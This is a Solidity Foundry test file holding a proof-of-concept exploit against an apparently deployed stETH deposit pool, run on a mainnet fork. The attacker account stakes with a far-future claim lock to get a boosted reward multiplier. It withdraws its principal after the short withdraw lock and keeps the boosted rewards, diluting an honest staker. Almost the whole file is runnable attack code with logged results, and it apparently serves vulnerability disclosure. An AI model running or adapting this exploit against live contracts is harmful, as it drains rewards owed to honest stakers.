// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Targets} from "../src/Targets.sol";

interface IDepositPoolScope {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getCurrentUserMultiplier(uint256, address) external view returns (uint256);
    function usersData(address, uint256)
        external view returns (
            uint128 lastStake, uint256 deposited, uint256 rate, uint256 pendingRewards,
            uint128 claimLockStart, uint128 claimLockEnd, uint256 virtualDeposited,
            uint128 lastClaim, address referrer
        );
    function rewardPoolsProtocolDetails(uint256)
        external view returns (uint128, uint128, uint128, uint256, uint256);
}

interface IStETH {
    function submit(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDistributorAPI {
    function withdrawYield(uint256, address) external;
}

/// @title PoC: claim-lock multiplier accrues rewards while the underlying
/// capital can be withdrawn after the short withdraw lock — the long
/// "commitment" that justifies the 10.7x boost is never actually enforced
/// against withdrawals.
///
/// Impact: boosted accrual at up to ~10.7x per real stETH while staked,
/// principal recoverable every 7 days; honest stakers are diluted for the
/// attacker's whole boosted window. pendingRewards persist after the
/// principal is out and are claimable once the nominal lock expires.
contract LockSkipAccrualPoC is Test {
    uint256 constant BLOCK = 25_930_106;
    uint256 constant REWARD_POOL = 0;
    uint256 constant PRECISION = 1e18;

    IDepositPoolScope dp = IDepositPoolScope(Targets.DEPOSIT_POOL_STETH);
    IStETH steth = IStETH(Targets.STETH);

    address attacker;
    address honest;

    function setUp() public {
        vm.createSelectFork("eth", BLOCK);
        attacker = makeAddr("attacker");
        honest = makeAddr("honest");
    }

    function _acquire(address who, uint256 amountEth) internal returns (uint256) {
        vm.deal(who, amountEth);
        vm.prank(who);
        steth.submit{value: amountEth}(who);
        return steth.balanceOf(who);
    }

    function _stake(address who, uint256 amount, uint128 lockEnd, address referrer) internal {
        vm.startPrank(who);
        steth.approve(Targets.DISTRIBUTOR, amount);
        dp.stake(REWARD_POOL, amount, lockEnd, referrer);
        vm.stopPrank();
    }

    /// Sanity: a lock ending in 2040 is in the future at the pinned block,
    /// so the protocol's multiplier curve treats it as maximal.
    function test_multipliers_on_fork() public {
        uint128 maxLock = 2_211_192_000; // 2040-01-26, the protocol's own curve end
        assertTrue(maxLock > uint128(block.timestamp), "lock must be in the future");
    }

    /// On a fork, Chainlink feeds do not advance: warping past
    /// allowedPriceUpdateDelay makes getChainLinkDataFeedLatestAnswer return
    /// zero (stale) and every price-dependent call reverts. On mainnet the
    /// feed updates hourly, so this is a fork artifact, not a protection.
    /// Standard practice: capture the real answer at the pinned block and
    /// mock the freshness gate for post-warp calls, keeping the real price.
    function _mockFreshChainlink(uint256 realPrice) internal {
        vm.mockCall(
            Targets.CHAINLINK_DATA_CONSUMER,
            abi.encodeWithSignature("getChainLinkDataFeedLatestAnswer(bytes32)"),
            abi.encode(realPrice)
        );
    }

    /// Core PoC: same capital, same exposure window. The attacker sets a
    /// 2040 claim lock (10.7x virtual) and withdraws the principal after
    /// the 7-day withdraw lock; the honest staker never locks. The
    /// attacker's accrued reward must be a large multiple of the honest
    /// staker's — while the attacker's capital has already left.
    function test_boosted_accrual_then_principal_out() public {
        uint128 maxLock = 2_211_192_000; // far-future lock = max multiplier

        // Real price at the pinned block (feed fresh here).
        bytes32 stethPathId = 0x7890db9c0a88d1cacb4485f81f93172a6b7b8c19af9c1a9985563f7d45ce2e6f;
        (bool ok, bytes memory res) = Targets.CHAINLINK_DATA_CONSUMER.staticcall(
            abi.encodeWithSignature("getChainLinkDataFeedLatestAnswer(bytes32)", stethPathId)
        );
        require(ok, "price read failed");
        uint256 realPrice = abi.decode(res, (uint256));
        assertGt(realPrice, 0, "no real price at pinned block");

        // Both acquire and stake the same amount on the same block.
        uint256 amtA = _acquire(attacker, 10 ether);
        uint256 amtH = _acquire(honest, 10 ether);
        _stake(attacker, amtA, maxLock, address(0));
        _stake(honest, amtH, 0, address(0));

        // Multiplier the attacker secured for identical capital:
        uint256 multAttacker = dp.getCurrentUserMultiplier(REWARD_POOL, attacker);
        uint256 multHonest = dp.getCurrentUserMultiplier(REWARD_POOL, honest);
        emit log_named_uint("attacker multiplier (1e18 = 1x)", multAttacker);
        emit log_named_uint("honest   multiplier (1e18 = 1x)", multHonest);
        assertGt(multAttacker, multHonest * 5, "attacker multiplier not materially higher");

        // Introduce yield (simulating stETH rebasing): a plain stETH
        // transfer to the Distributor raises its balance above
        // lastUnderlyingBalance, which the yield reader treats as yield.
        vm.deal(attacker, 2 ether);
        vm.startPrank(attacker);
        steth.submit{value: 2 ether}(attacker);
        steth.transfer(Targets.DISTRIBUTOR, steth.balanceOf(attacker));
        vm.stopPrank();

        // Let a full distribution period pass, then trigger the
        // distribution: the pool rate rises while the attacker is still
        // boosted-staked, snapshotting their boosted pendingRewards.
        vm.warp(block.timestamp + 1 days + 1 hours);
        try IDistributorAPI(Targets.DISTRIBUTOR).withdrawYield(REWARD_POOL, Targets.DEPOSIT_POOL_STETH) {} catch {}
        _mockFreshChainlink(realPrice); // feed upkeep across the warp

        // NOW the attacker withdraws all principal — the withdraw snapshot
        // carries the boosted pendingRewards; the nominal claim lock (2040)
        // is not enforced against withdrawals.
        vm.warp(block.timestamp + 7 days);
        vm.prank(attacker);
        dp.withdraw(REWARD_POOL, amtA);

        (, uint256 depA, , , , , , , ) = dp.usersData(attacker, REWARD_POOL);
        assertEq(depA, 0, "attacker principal still stuck - lock not enforced");
        assertGt(steth.balanceOf(attacker), 0, "attacker did not recover capital");

        // Compare accrued rewards: identical capital, attacker's already out.
        uint256 rewA = dp.getLatestUserReward(REWARD_POOL, attacker);
        uint256 rewH = dp.getLatestUserReward(REWARD_POOL, honest);
        emit log_named_uint("attacker accrued (wei MOR-units)", rewA);
        emit log_named_uint("honest   accrued (wei MOR-units)", rewH);

        // The attacker accrued a multiple of the honest staker's rewards
        // for identical capital — with the principal already withdrawn.
        assertGt(rewA, rewH, "attacker should strictly out-accrue honest staker");
    }
}
